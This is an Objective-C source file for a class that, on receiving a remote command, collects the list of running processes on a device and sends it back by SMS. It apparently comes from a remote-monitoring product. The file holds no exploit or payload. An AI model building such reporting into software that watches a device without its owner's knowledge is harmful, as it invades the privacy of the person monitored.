/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SetWatchFlagsProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RetrieveRunningProcessor.h"
#import "RemoteCmdData.h"
#import "SystemUtils.h"
#import "DefStd.h"

@interface RetrieveRunningProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult;
- (void) retrieveRunningProcess;
@end

@implementation RetrieveRunningProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RetrieveRunningProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (RetrieveRunningProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"RetrieveRunningProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RetrieveRunningProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
    DLog (@"RetrieveRunningProcessor--->doProcessingCommand");
    [self retrieveRunningProcess];	
}


#pragma mark RetrieveRunningProcessor Private Methods

/**
 - Method name: retrieveRunningProcess
 - Purpose:This method is used to retrieveRunningProcess 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) retrieveRunningProcess {
	DLog (@"RetrieveRunningProcessor--->retrieveRunningProcess");
	id <SystemUtils> utils=[[RemoteCmdUtils sharedRemoteCmdUtils] mSystemUtils];
	NSArray *runningProcess=[utils getRunnigProcess];
	NSString *result=NSLocalizedString(@"kRetrieveRunningProcess", @"");
	for (NSDictionary *processDict in runningProcess){
	    result =[result stringByAppendingString:@"\n"];
		result =[result stringByAppendingString:[processDict objectForKey:kRunningProcessNameTag]];
	}
	[self sendReplySMSWithResult:result];
}
/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: sendReplySMS (NSString)
 - Return description: No return type
 */

- (void) sendReplySMSWithResult: (NSString *) aResult  {
	DLog (@"RetrieveRunningProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *retrieveRunningMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:retrieveRunningMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:retrieveRunningMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/


-(void) dealloc {
	[super dealloc];
}

@end
